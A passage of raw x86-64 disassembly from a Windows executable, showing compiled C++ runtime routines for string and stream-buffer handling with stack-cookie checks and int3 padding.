   1400059ca:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   1400059ce:	48 2b c1             	sub    %rcx,%rax
   1400059d1:	48 83 e8 08          	sub    $0x8,%rax
   1400059d5:	48 83 f8 1f          	cmp    $0x1f,%rax
   1400059d9:	76 7d                	jbe    0x140005a58
   1400059db:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   1400059e2:	00 00 
   1400059e4:	45 33 c9             	xor    %r9d,%r9d
   1400059e7:	45 33 c0             	xor    %r8d,%r8d
   1400059ea:	33 d2                	xor    %edx,%edx
   1400059ec:	33 c9                	xor    %ecx,%ecx
   1400059ee:	ff 15 dc 3a 00 00    	call   *0x3adc(%rip)        # 0x1400094d0
   1400059f4:	90                   	nop
   1400059f5:	83 f8 02             	cmp    $0x2,%eax
   1400059f8:	75 a2                	jne    0x14000599c
   1400059fa:	48 8d 45 d8          	lea    -0x28(%rbp),%rax
   1400059fe:	48 83 7d f0 0f       	cmpq   $0xf,-0x10(%rbp)
   140005a03:	48 0f 47 45 d8       	cmova  -0x28(%rbp),%rax
   140005a08:	0f be 18             	movsbl (%rax),%ebx
   140005a0b:	eb 94                	jmp    0x1400059a1
   140005a0d:	48 83 7d f0 0f       	cmpq   $0xf,-0x10(%rbp)
   140005a12:	48 0f 47 45 d8       	cmova  -0x28(%rbp),%rax
   140005a17:	48 8b 4d c0          	mov    -0x40(%rbp),%rcx
   140005a1b:	48 2b d9             	sub    %rcx,%rbx
   140005a1e:	48 03 d8             	add    %rax,%rbx
   140005a21:	48 85 db             	test   %rbx,%rbx
   140005a24:	7e 29                	jle    0x140005a4f
   140005a26:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140005a2d:	00 00 00 
   140005a30:	48 ff cb             	dec    %rbx
   140005a33:	0f be 0c 0b          	movsbl (%rbx,%rcx,1),%ecx
   140005a37:	48 8b 97 80 00 00 00 	mov    0x80(%rdi),%rdx
   140005a3e:	ff 15 44 3b 00 00    	call   *0x3b44(%rip)        # 0x140009588
   140005a44:	48 85 db             	test   %rbx,%rbx
   140005a47:	7e 06                	jle    0x140005a4f
   140005a49:	48 8b 4d c0          	mov    -0x40(%rbp),%rcx
   140005a4d:	eb e1                	jmp    0x140005a30
   140005a4f:	0f b6 5d d0          	movzbl -0x30(%rbp),%ebx
   140005a53:	e9 49 ff ff ff       	jmp    0x1400059a1
   140005a58:	e8 83 14 00 00       	call   0x140006ee0
   140005a5d:	8b c3                	mov    %ebx,%eax
   140005a5f:	48 8b 4d f8          	mov    -0x8(%rbp),%rcx
   140005a63:	48 33 cc             	xor    %rsp,%rcx
   140005a66:	e8 55 14 00 00       	call   0x140006ec0
   140005a6b:	4c 8d 9c 24 80 00 00 	lea    0x80(%rsp),%r11
   140005a72:	00 
   140005a73:	49 8b 5b 18          	mov    0x18(%r11),%rbx
   140005a77:	49 8b 73 20          	mov    0x20(%r11),%rsi
   140005a7b:	49 8b 7b 28          	mov    0x28(%r11),%rdi
   140005a7f:	49 8b e3             	mov    %r11,%rsp
   140005a82:	5d                   	pop    %rbp
   140005a83:	c3                   	ret
   140005a84:	cc                   	int3
   140005a85:	cc                   	int3
   140005a86:	cc                   	int3
   140005a87:	cc                   	int3
   140005a88:	cc                   	int3
   140005a89:	cc                   	int3
   140005a8a:	cc                   	int3
   140005a8b:	cc                   	int3
   140005a8c:	cc                   	int3
   140005a8d:	cc                   	int3
   140005a8e:	cc                   	int3
   140005a8f:	cc                   	int3
   140005a90:	40 53                	rex push %rbx
   140005a92:	48 83 ec 20          	sub    $0x20,%rsp
   140005a96:	48 8b 41 38          	mov    0x38(%rcx),%rax
   140005a9a:	48 8b d9             	mov    %rcx,%rbx
   140005a9d:	48 8b 08             	mov    (%rax),%rcx
   140005aa0:	48 85 c9             	test   %rcx,%rcx
   140005aa3:	74 18                	je     0x140005abd
   140005aa5:	48 8b 43 50          	mov    0x50(%rbx),%rax
   140005aa9:	48 63 10             	movslq (%rax),%rdx
   140005aac:	48 03 d1             	add    %rcx,%rdx
   140005aaf:	48 3b ca             	cmp    %rdx,%rcx
   140005ab2:	73 09                	jae    0x140005abd
   140005ab4:	0f b6 01             	movzbl (%rcx),%eax
   140005ab7:	48 83 c4 20          	add    $0x20,%rsp
   140005abb:	5b                   	pop    %rbx
   140005abc:	c3                   	ret
   140005abd:	48 8b 03             	mov    (%rbx),%rax
   140005ac0:	48 8b cb             	mov    %rbx,%rcx
   140005ac3:	48 89 7c 24 30       	mov    %rdi,0x30(%rsp)
   140005ac8:	ff 50 38             	call   *0x38(%rax)
   140005acb:	8b f8                	mov    %eax,%edi
   140005acd:	83 f8 ff             	cmp    $0xffffffff,%eax
   140005ad0:	75 0b                	jne    0x140005add
   140005ad2:	48 8b 7c 24 30       	mov    0x30(%rsp),%rdi
   140005ad7:	48 83 c4 20          	add    $0x20,%rsp
   140005adb:	5b                   	pop    %rbx
   140005adc:	c3                   	ret
   140005add:	48 8b 03             	mov    (%rbx),%rax
   140005ae0:	8b d7                	mov    %edi,%edx
   140005ae2:	48 8b cb             	mov    %rbx,%rcx
   140005ae5:	ff 50 20             	call   *0x20(%rax)
   140005ae8:	8b c7                	mov    %edi,%eax
   140005aea:	48 8b 7c 24 30       	mov    0x30(%rsp),%rdi
   140005aef:	48 83 c4 20          	add    $0x20,%rsp
   140005af3:	5b                   	pop    %rbx
   140005af4:	c3                   	ret
   140005af5:	cc                   	int3
   140005af6:	cc                   	int3
   140005af7:	cc                   	int3
   140005af8:	cc                   	int3
   140005af9:	cc                   	int3
   140005afa:	cc                   	int3
   140005afb:	cc                   	int3
   140005afc:	cc                   	int3
   140005afd:	cc                   	int3
   140005afe:	cc                   	int3
   140005aff:	cc                   	int3
   140005b00:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005b05:	57                   	push   %rdi
   140005b06:	48 83 ec 20          	sub    $0x20,%rsp
   140005b0a:	48 8b 41 38          	mov    0x38(%rcx),%rax
   140005b0e:	48 8b d9             	mov    %rcx,%rbx
   140005b11:	8b fa                	mov    %edx,%edi
   140005b13:	48 8b 08             	mov    (%rax),%rcx
   140005b16:	48 85 c9             	test   %rcx,%rcx
   140005b19:	74 38                	je     0x140005b53
   140005b1b:	48 8b 43 18          	mov    0x18(%rbx),%rax
   140005b1f:	48 39 08             	cmp    %rcx,(%rax)
   140005b22:	73 2f                	jae    0x140005b53
   140005b24:	83 fa ff             	cmp    $0xffffffff,%edx
   140005b27:	74 08                	je     0x140005b31
   140005b29:	0f b6 41 ff          	movzbl -0x1(%rcx),%eax
   140005b2d:	3b c2                	cmp    %edx,%eax
   140005b2f:	75 22                	jne    0x140005b53
   140005b31:	48 8b 43 50          	mov    0x50(%rbx),%rax
   140005b35:	ff 00                	incl   (%rax)
   140005b37:	48 8b 43 38          	mov    0x38(%rbx),%rax
   140005b3b:	48 ff 08             	decq   (%rax)
   140005b3e:	33 c0                	xor    %eax,%eax
   140005b40:	83 ff ff             	cmp    $0xffffffff,%edi
   140005b43:	0f 44 f8             	cmove  %eax,%edi
   140005b46:	8b c7                	mov    %edi,%eax
   140005b48:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140005b4d:	48 83 c4 20          	add    $0x20,%rsp
   140005b51:	5f                   	pop    %rdi
   140005b52:	c3                   	ret
   140005b53:	48 8b 93 80 00 00 00 	mov    0x80(%rbx),%rdx
   140005b5a:	48 85 d2             	test   %rdx,%rdx
   140005b5d:	74 73                	je     0x140005bd2
   140005b5f:	83 ff ff             	cmp    $0xffffffff,%edi
   140005b62:	74 6e                	je     0x140005bd2
   140005b64:	48 83 7b 68 00       	cmpq   $0x0,0x68(%rbx)
   140005b69:	75 0f                	jne    0x140005b7a
   140005b6b:	40 0f b6 cf          	movzbl %dil,%ecx
   140005b6f:	ff 15 13 3a 00 00    	call   *0x3a13(%rip)        # 0x140009588
   140005b75:	83 f8 ff             	cmp    $0xffffffff,%eax
   140005b78:	75 cc                	jne    0x140005b46
   140005b7a:	4c 8b 4b 38          	mov    0x38(%rbx),%r9
   140005b7e:	48 8d 53 70          	lea    0x70(%rbx),%rdx
   140005b82:	49 39 11             	cmp    %rdx,(%r9)
   140005b85:	74 4b                	je     0x140005bd2
   140005b87:	4c 8b 53 18          	mov    0x18(%rbx),%r10
   140005b8b:	4c 8d 43 50          	lea    0x50(%rbx),%r8
   140005b8f:	40 88 3a             	mov    %dil,(%rdx)
   140005b92:	49 8b 02             	mov    (%r10),%rax
   140005b95:	48 3b c2             	cmp    %rdx,%rax
   140005b98:	74 17                	je     0x140005bb1
   140005b9a:	48 89 83 88 00 00 00 	mov    %rax,0x88(%rbx)
   140005ba1:	49 8b 00             	mov    (%r8),%rax
   140005ba4:	48 63 08             	movslq (%rax),%rcx
   140005ba7:	49 03 09             	add    (%r9),%rcx
   140005baa:	48 89 8b 90 00 00 00 	mov    %rcx,0x90(%rbx)
   140005bb1:	49 89 12             	mov    %rdx,(%r10)
   140005bb4:	48 8b 43 38          	mov    0x38(%rbx),%rax
   140005bb8:	2b da                	sub    %edx,%ebx
   140005bba:	83 c3 71             	add    $0x71,%ebx
   140005bbd:	48 89 10             	mov    %rdx,(%rax)
   140005bc0:	49 8b 00             	mov    (%r8),%rax
   140005bc3:	89 18                	mov    %ebx,(%rax)
   140005bc5:	8b c7                	mov    %edi,%eax
   140005bc7:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140005bcc:	48 83 c4 20          	add    $0x20,%rsp
   140005bd0:	5f                   	pop    %rdi
   140005bd1:	c3                   	ret
   140005bd2:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140005bd7:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140005bdc:	48 83 c4 20          	add    $0x20,%rsp
   140005be0:	5f                   	pop    %rdi
   140005be1:	c3                   	ret
   140005be2:	cc                   	int3
   140005be3:	cc                   	int3
   140005be4:	cc                   	int3
   140005be5:	cc                   	int3
   140005be6:	cc                   	int3
   140005be7:	cc                   	int3
   140005be8:	cc                   	int3
   140005be9:	cc                   	int3
   140005bea:	cc                   	int3
   140005beb:	cc                   	int3
   140005bec:	cc                   	int3
   140005bed:	cc                   	int3
   140005bee:	cc                   	int3
   140005bef:	cc                   	int3
   140005bf0:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140005bf5:	57                   	push   %rdi
   140005bf6:	48 81 ec 80 00 00 00 	sub    $0x80,%rsp
   140005bfd:	48 8b 05 3c 84 00 00 	mov    0x843c(%rip),%rax        # 0x14000e040
   140005c04:	48 33 c4             	xor    %rsp,%rax
   140005c07:	48 89 44 24 78       	mov    %rax,0x78(%rsp)
   140005c0c:	8b fa                	mov    %edx,%edi
   140005c0e:	48 8b d9             	mov    %rcx,%rbx
   140005c11:	83 fa ff             	cmp    $0xffffffff,%edx
   140005c14:	75 07                	jne    0x140005c1d
   140005c16:	33 c0                	xor    %eax,%eax
   140005c18:	e9 6c 01 00 00       	jmp    0x140005d89
   140005c1d:	48 8b 41 40          	mov    0x40(%rcx),%rax
   140005c21:	48 8b 10             	mov    (%rax),%rdx
   140005c24:	48 85 d2             	test   %rdx,%rdx
   140005c27:	74 2e                	je     0x140005c57
   140005c29:	48 8b 41 58          	mov    0x58(%rcx),%rax
   140005c2d:	4c 63 00             	movslq (%rax),%r8
   140005c30:	4a 8d 0c 02          	lea    (%rdx,%r8,1),%rcx
   140005c34:	48 3b d1             	cmp    %rcx,%rdx
   140005c37:	73 1e                	jae    0x140005c57
   140005c39:	41 8d 48 ff          	lea    -0x1(%r8),%ecx
   140005c3d:	89 08                	mov    %ecx,(%rax)
   140005c3f:	8b c7                	mov    %edi,%eax
   140005c41:	48 8b 53 40          	mov    0x40(%rbx),%rdx
   140005c45:	4c 8b 02             	mov    (%rdx),%r8
   140005c48:	49 8d 48 01          	lea    0x1(%r8),%rcx
   140005c4c:	48 89 0a             	mov    %rcx,(%rdx)
   140005c4f:	41 88 38             	mov    %dil,(%r8)
   140005c52:	e9 32 01 00 00       	jmp    0x140005d89
   140005c57:	48 83 bb 80 00 00 00 	cmpq   $0x0,0x80(%rbx)
   140005c5e:	00 
   140005c5f:	48 89 b4 24 a0 00 00 	mov    %rsi,0xa0(%rsp)
   140005c66:	00 
   140005c67:	0f 84 0f 01 00 00    	je     0x140005d7c
   140005c6d:	4c 8b 43 18          	mov    0x18(%rbx),%r8
   140005c71:	48 8d 43 70          	lea    0x70(%rbx),%rax
   140005c75:	49 39 00             	cmp    %rax,(%r8)
   140005c78:	75 20                	jne    0x140005c9a
   140005c7a:	48 8b 8b 88 00 00 00 	mov    0x88(%rbx),%rcx
   140005c81:	48 8b 93 90 00 00 00 	mov    0x90(%rbx),%rdx
   140005c88:	49 89 08             	mov    %rcx,(%r8)
   140005c8b:	2b d1                	sub    %ecx,%edx
   140005c8d:	48 8b 43 38          	mov    0x38(%rbx),%rax
   140005c91:	48 89 08             	mov    %rcx,(%rax)
   140005c94:	48 8b 43 50          	mov    0x50(%rbx),%rax
   140005c98:	89 10                	mov    %edx,(%rax)
   140005c9a:	48 8b 4b 68          	mov    0x68(%rbx),%rcx
   140005c9e:	48 85 c9             	test   %rcx,%rcx
   140005ca1:	75 22                	jne    0x140005cc5
   140005ca3:	48 8b 93 80 00 00 00 	mov    0x80(%rbx),%rdx
   140005caa:	40 0f be cf          	movsbl %dil,%ecx
   140005cae:	ff 15 b4 38 00 00    	call   *0x38b4(%rip)        # 0x140009568
   140005cb4:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
   140005cb9:	3b c1                	cmp    %ecx,%eax
   140005cbb:	0f 45 cf             	cmovne %edi,%ecx
   140005cbe:	8b c1                	mov    %ecx,%eax
   140005cc0:	e9 bc 00 00 00       	jmp    0x140005d81
   140005cc5:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   140005cca:	40 88 7c 24 50       	mov    %dil,0x50(%rsp)
   140005ccf:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140005cd4:	48 8d 53 74          	lea    0x74(%rbx),%rdx
   140005cd8:	48 8d 44 24 78       	lea    0x78(%rsp),%rax
   140005cdd:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140005ce2:	4c 8d 4c 24 51       	lea    0x51(%rsp),%r9
   140005ce7:	48 8d 44 24 58       	lea    0x58(%rsp),%rax
   140005cec:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140005cf1:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   140005cf6:	48 8d 44 24 48       	lea    0x48(%rsp),%rax
   140005cfb:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140005d00:	ff 15 ba 34 00 00    	call   *0x34ba(%rip)        # 0x1400091c0
   140005d06:	85 c0                	test   %eax,%eax
   140005d08:	74 2a                	je     0x140005d34
   140005d0a:	83 e8 01             	sub    $0x1,%eax
   140005d0d:	74 25                	je     0x140005d34
   140005d0f:	83 f8 02             	cmp    $0x2,%eax
   140005d12:	75 68                	jne    0x140005d7c
   140005d14:	0f be 4c 24 50       	movsbl 0x50(%rsp),%ecx
   140005d19:	48 8b 93 80 00 00 00 	mov    0x80(%rbx),%rdx
   140005d20:	ff 15 42 38 00 00    	call   *0x3842(%rip)        # 0x140009568
   140005d26:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
   140005d2b:	3b c1                	cmp    %ecx,%eax
   140005d2d:	0f 45 cf             	cmovne %edi,%ecx
   140005d30:	8b c1                	mov    %ecx,%eax
   140005d32:	eb 4d                	jmp    0x140005d81
   140005d34:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140005d39:	48 8d 44 24 58       	lea    0x58(%rsp),%rax
   140005d3e:	48 2b f0             	sub    %rax,%rsi
   140005d41:	74 1f                	je     0x140005d62
   140005d43:	4c 8b 8b 80 00 00 00 	mov    0x80(%rbx),%r9
   140005d4a:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   140005d4f:	4c 8b c6             	mov    %rsi,%r8
   140005d52:	ba 01 00 00 00       	mov    $0x1,%edx
   140005d57:	ff 15 23 38 00 00    	call   *0x3823(%rip)        # 0x140009580
   140005d5d:	48 3b f0             	cmp    %rax,%rsi
   140005d60:	75 1a                	jne    0x140005d7c
   140005d62:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   140005d67:	c6 43 71 01          	movb   $0x1,0x71(%rbx)
   140005d6b:	48 39 44 24 48       	cmp    %rax,0x48(%rsp)
   140005d70:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
   140005d75:	0f 45 cf             	cmovne %edi,%ecx
   140005d78:	8b c1                	mov    %ecx,%eax
   140005d7a:	eb 05                	jmp    0x140005d81
   140005d7c:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140005d81:	48 8b b4 24 a0 00 00 	mov    0xa0(%rsp),%rsi
   140005d88:	00 
   140005d89:	48 8b 4c 24 78       	mov    0x78(%rsp),%rcx
   140005d8e:	48 33 cc             	xor    %rsp,%rcx
   140005d91:	e8 2a 11 00 00       	call   0x140006ec0
   140005d96:	48 8b 9c 24 a8 00 00 	mov    0xa8(%rsp),%rbx
   140005d9d:	00 
   140005d9e:	48 81 c4 80 00 00 00 	add    $0x80,%rsp
   140005da5:	5f                   	pop    %rdi
   140005da6:	c3                   	ret
   140005da7:	cc                   	int3
   140005da8:	cc                   	int3
   140005da9:	cc                   	int3
   140005daa:	cc                   	int3
   140005dab:	cc                   	int3
   140005dac:	cc                   	int3
   140005dad:	cc                   	int3
   140005dae:	cc                   	int3
   140005daf:	cc                   	int3
   140005db0:	48 8b 89 80 00 00 00 	mov    0x80(%rcx),%rcx
   140005db7:	48 85 c9             	test   %rcx,%rcx
   140005dba:	74 07                	je     0x140005dc3
   140005dbc:	48 ff 25 a5 36 00 00 	rex.W jmp *0x36a5(%rip)        # 0x140009468
   140005dc3:	c3                   	ret
   140005dc4:	cc                   	int3
   140005dc5:	cc                   	int3
   140005dc6:	cc                   	int3
   140005dc7:	cc                   	int3
   140005dc8:	cc                   	int3
   140005dc9:	cc                   	int3
   140005dca:	cc                   	int3
   140005dcb:	cc                   	int3
   140005dcc:	cc                   	int3
   140005dcd:	cc                   	int3
   140005dce:	cc                   	int3
   140005dcf:	cc                   	int3
   140005dd0:	48 8b 89 80 00 00 00 	mov    0x80(%rcx),%rcx
   140005dd7:	48 85 c9             	test   %rcx,%rcx
   140005dda:	74 07                	je     0x140005de3
   140005ddc:	48 ff 25 8d 36 00 00 	rex.W jmp *0x368d(%rip)        # 0x140009470
   140005de3:	c3                   	ret
   140005de4:	cc                   	int3
   140005de5:	cc                   	int3
   140005de6:	cc                   	int3
   140005de7:	cc                   	int3
   140005de8:	cc                   	int3
   140005de9:	cc                   	int3
   140005dea:	cc                   	int3
   140005deb:	cc                   	int3
   140005dec:	cc                   	int3
   140005ded:	cc                   	int3
   140005dee:	cc                   	int3
   140005def:	cc                   	int3
   140005df0:	40 53                	rex push %rbx
   140005df2:	48 83 ec 20          	sub    $0x20,%rsp
   140005df6:	48 8b d9             	mov    %rcx,%rbx
   140005df9:	48 8d 05 88 42 00 00 	lea    0x4288(%rip),%rax        # 0x14000a088
   140005e00:	48 89 01             	mov    %rax,(%rcx)
   140005e03:	48 83 b9 80 00 00 00 	cmpq   $0x0,0x80(%rcx)
   140005e0a:	00 
   140005e0b:	74 2f                	je     0x140005e3c
   140005e0d:	48 8b 49 18          	mov    0x18(%rcx),%rcx
   140005e11:	48 8d 43 70          	lea    0x70(%rbx),%rax
   140005e15:	48 39 01             	cmp    %rax,(%rcx)
   140005e18:	75 22                	jne    0x140005e3c
   140005e1a:	4c 8b 83 90 00 00 00 	mov    0x90(%rbx),%r8
   140005e21:	48 8b 93 88 00 00 00 	mov    0x88(%rbx),%rdx
   140005e28:	48 89 11             	mov    %rdx,(%rcx)
   140005e2b:	48 8b 43 38          	mov    0x38(%rbx),%rax
   140005e2f:	48 89 10             	mov    %rdx,(%rax)
   140005e32:	44 2b c2             	sub    %edx,%r8d
   140005e35:	48 8b 43 50          	mov    0x50(%rbx),%rax
   140005e39:	44 89 00             	mov    %r8d,(%rax)
   140005e3c:	80 7b 7c 00          	cmpb   $0x0,0x7c(%rbx)
   140005e40:	74 08                	je     0x140005e4a
   140005e42:	48 8b cb             	mov    %rbx,%rcx
   140005e45:	e8 56 06 00 00       	call   0x1400064a0
   140005e4a:	48 8b cb             	mov    %rbx,%rcx
   140005e4d:	48 83 c4 20          	add    $0x20,%rsp
   140005e51:	5b                   	pop    %rbx
   140005e52:	48 ff 25 57 33 00 00 	rex.W jmp *0x3357(%rip)        # 0x1400091b0
   140005e59:	cc                   	int3
   140005e5a:	cc                   	int3
   140005e5b:	cc                   	int3
   140005e5c:	cc                   	int3
   140005e5d:	cc                   	int3
   140005e5e:	cc                   	int3
   140005e5f:	cc                   	int3
   140005e60:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005e65:	57                   	push   %rdi
   140005e66:	48 83 ec 20          	sub    $0x20,%rsp
   140005e6a:	48 8d b9 58 ff ff ff 	lea    -0xa8(%rcx),%rdi
   140005e71:	8b da                	mov    %edx,%ebx
   140005e73:	48 8b cf             	mov    %rdi,%rcx
   140005e76:	e8 95 d7 ff ff       	call   0x140003610
   140005e7b:	f6 c3 01             	test   $0x1,%bl
   140005e7e:	74 0d                	je     0x140005e8d
   140005e80:	ba 08 01 00 00       	mov    $0x108,%edx
   140005e85:	48 8b cf             	mov    %rdi,%rcx
   140005e88:	e8 53 10 00 00       	call   0x140006ee0
   140005e8d:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140005e92:	48 8b c7             	mov    %rdi,%rax
   140005e95:	48 83 c4 20          	add    $0x20,%rsp
   140005e99:	5f                   	pop    %rdi
   140005e9a:	c3                   	ret
   140005e9b:	cc                   	int3
   140005e9c:	cc                   	int3
   140005e9d:	cc                   	int3
   140005e9e:	cc                   	int3
   140005e9f:	cc                   	int3
   140005ea0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005ea5:	57                   	push   %rdi
   140005ea6:	48 83 ec 20          	sub    $0x20,%rsp
   140005eaa:	8b fa                	mov    %edx,%edi
   140005eac:	48 8b d9             	mov    %rcx,%rbx
   140005eaf:	48 8d 05 d2 41 00 00 	lea    0x41d2(%rip),%rax        # 0x14000a088
   140005eb6:	48 89 01             	mov    %rax,(%rcx)
   140005eb9:	48 83 b9 80 00 00 00 	cmpq   $0x0,0x80(%rcx)
   140005ec0:	00 
   140005ec1:	74 2d                	je     0x140005ef0
   140005ec3:	4c 8b 41 18          	mov    0x18(%rcx),%r8
   140005ec7:	48 8d 41 70          	lea    0x70(%rcx),%rax
   140005ecb:	49 39 00             	cmp    %rax,(%r8)
   140005ece:	75 20                	jne    0x140005ef0
   140005ed0:	48 8b 91 90 00 00 00 	mov    0x90(%rcx),%rdx
   140005ed7:	48 8b 89 88 00 00 00 	mov    0x88(%rcx),%rcx
   140005ede:	49 89 08             	mov    %rcx,(%r8)
   140005ee1:	48 8b 43 38          	mov    0x38(%rbx),%rax
   140005ee5:	48 89 08             	mov    %rcx,(%rax)
   140005ee8:	2b d1                	sub    %ecx,%edx
   140005eea:	48 8b 43 50          	mov    0x50(%rbx),%rax
   140005eee:	89 10                	mov    %edx,(%rax)
   140005ef0:	80 7b 7c 00          	cmpb   $0x0,0x7c(%rbx)
   140005ef4:	74 08                	je     0x140005efe
   140005ef6:	48 8b cb             	mov    %rbx,%rcx
   140005ef9:	e8 a2 05 00 00       	call   0x1400064a0
   140005efe:	48 8b cb             	mov    %rbx,%rcx
   140005f01:	ff 15 a9 32 00 00    	call   *0x32a9(%rip)        # 0x1400091b0
   140005f07:	90                   	nop
   140005f08:	40 f6 c7 01          	test   $0x1,%dil
   140005f0c:	74 0d                	je     0x140005f1b
   140005f0e:	ba 98 00 00 00       	mov    $0x98,%edx
   140005f13:	48 8b cb             	mov    %rbx,%rcx
   140005f16:	e8 c5 0f 00 00       	call   0x140006ee0
   140005f1b:	48 8b c3             	mov    %rbx,%rax
   140005f1e:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140005f23:	48 83 c4 20          	add    $0x20,%rsp
   140005f27:	5f                   	pop    %rdi
   140005f28:	c3                   	ret
   140005f29:	cc                   	int3
   140005f2a:	cc                   	int3
   140005f2b:	cc                   	int3
   140005f2c:	cc                   	int3
   140005f2d:	cc                   	int3
   140005f2e:	cc                   	int3
   140005f2f:	cc                   	int3
   140005f30:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140005f35:	55                   	push   %rbp
   140005f36:	56                   	push   %rsi
   140005f37:	57                   	push   %rdi
   140005f38:	41 56                	push   %r14
   140005f3a:	41 57                	push   %r15
   140005f3c:	48 83 ec 30          	sub    $0x30,%rsp
   140005f40:	45 33 ff             	xor    %r15d,%r15d
   140005f43:	0f 57 c0             	xorps  %xmm0,%xmm0
   140005f46:	49 8b d8             	mov    %r8,%rbx
   140005f49:	4c 8b f2             	mov    %rdx,%r14
   140005f4c:	48 8b f9             	mov    %rcx,%rdi
   140005f4f:	0f 11 01             	movups %xmm0,(%rcx)
   140005f52:	4c 89 79 10          	mov    %r15,0x10(%rcx)
   140005f56:	4c 89 79 18          	mov    %r15,0x18(%rcx)
   140005f5a:	49 3b d0             	cmp    %r8,%rdx
   140005f5d:	75 11                	jne    0x140005f70
   140005f5f:	48 c7 41 18 07 00 00 	movq   $0x7,0x18(%rcx)
   140005f66:	00 
   140005f67:	66 44 89 39          	mov    %r15w,(%rcx)
   140005f6b:	e9 f6 00 00 00       	jmp    0x140006066
   140005f70:	49 2b de             	sub    %r14,%rbx
   140005f73:	48 bd fe ff ff ff ff 	movabs $0x7ffffffffffffffe,%rbp
   140005f7a:	ff ff 7f 
   140005f7d:	48 d1 fb             	sar    $1,%rbx
   140005f80:	48 3b dd             	cmp    %rbp,%rbx
   140005f83:	0f 87 f1 00 00 00    	ja     0x14000607a
   140005f89:	48 83 fb 07          	cmp    $0x7,%rbx
   140005f8d:	77 21                	ja     0x140005fb0
   140005f8f:	48 89 59 10          	mov    %rbx,0x10(%rcx)
   140005f93:	48 03 db             	add    %rbx,%rbx
   140005f96:	4c 8b c3             	mov    %rbx,%r8
   140005f99:	48 c7 41 18 07 00 00 	movq   $0x7,0x18(%rcx)
   140005fa0:	00 
   140005fa1:	e8 a5 1f 00 00       	call   0x140007f4b
   140005fa6:	66 44 89 3c 3b       	mov    %r15w,(%rbx,%rdi,1)
   140005fab:	e9 b6 00 00 00       	jmp    0x140006066
   140005fb0:	48 8b c3             	mov    %rbx,%rax
   140005fb3:	48 83 c8 07          	or     $0x7,%rax
   140005fb7:	48 3b c5             	cmp    %rbp,%rax
   140005fba:	76 47                	jbe    0x140006003
   140005fbc:	48 b8 ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rax
   140005fc3:	ff ff 7f 
   140005fc6:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
   140005fca:	48 81 f9 00 10 00 00 	cmp    $0x1000,%rcx
   140005fd1:	72 6a                	jb     0x14000603d
   140005fd3:	48 8d 41 27          	lea    0x27(%rcx),%rax
   140005fd7:	48 3b c1             	cmp    %rcx,%rax
   140005fda:	0f 86 a0 00 00 00    	jbe    0x140006080
   140005fe0:	48 8b c8             	mov    %rax,%rcx
   140005fe3:	e8 00 0f 00 00       	call   0x140006ee8
   140005fe8:	48 85 c0             	test   %rax,%rax
   140005feb:	75 42                	jne    0x14000602f
   140005fed:	45 33 c9             	xor    %r9d,%r9d
   140005ff0:	4c 89 7c 24 20       	mov    %r15,0x20(%rsp)
   140005ff5:	45 33 c0             	xor    %r8d,%r8d
   140005ff8:	33 d2                	xor    %edx,%edx
   140005ffa:	33 c9                	xor    %ecx,%ecx
   140005ffc:	ff 15 ce 34 00 00    	call   *0x34ce(%rip)        # 0x1400094d0
   140006002:	cc                   	int3
   140006003:	b9 0a 00 00 00       	mov    $0xa,%ecx
   140006008:	48 8b e8             	mov    %rax,%rbp
   14000600b:	48 3b c1             	cmp    %rcx,%rax
   14000600e:	48 b8 ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rax
   140006015:	ff ff 7f 
   140006018:	48 0f 42 e9          	cmovb  %rcx,%rbp
   14000601c:	48 8d 4d 01          	lea    0x1(%rbp),%rcx
   140006020:	48 3b c8             	cmp    %rax,%rcx
   140006023:	77 5b                	ja     0x140006080
   140006025:	48 03 c9             	add    %rcx,%rcx
   140006028:	75 a0                	jne    0x140005fca
   14000602a:	49 8b f7             	mov    %r15,%rsi
   14000602d:	eb 16                	jmp    0x140006045
   14000602f:	48 8d 70 27          	lea    0x27(%rax),%rsi
   140006033:	48 83 e6 e0          	and    $0xffffffffffffffe0,%rsi
   140006037:	48 89 46 f8          	mov    %rax,-0x8(%rsi)
   14000603b:	eb 08                	jmp    0x140006045
   14000603d:	e8 a6 0e 00 00       	call   0x140006ee8
   140006042:	48 8b f0             	mov    %rax,%rsi
   140006045:	48 89 5f 10          	mov    %rbx,0x10(%rdi)
   140006049:	49 8b d6             	mov    %r14,%rdx
   14000604c:	48 03 db             	add    %rbx,%rbx
   14000604f:	48 89 37             	mov    %rsi,(%rdi)
   140006052:	4c 8b c3             	mov    %rbx,%r8
   140006055:	48 89 6f 18          	mov    %rbp,0x18(%rdi)
   140006059:	48 8b ce             	mov    %rsi,%rcx
   14000605c:	e8 ea 1e 00 00       	call   0x140007f4b
   140006061:	66 44 89 3c 33       	mov    %r15w,(%rbx,%rsi,1)
   140006066:	48 8b 5c 24 78       	mov    0x78(%rsp),%rbx
   14000606b:	48 8b c7             	mov    %rdi,%rax
   14000606e:	48 83 c4 30          	add    $0x30,%rsp
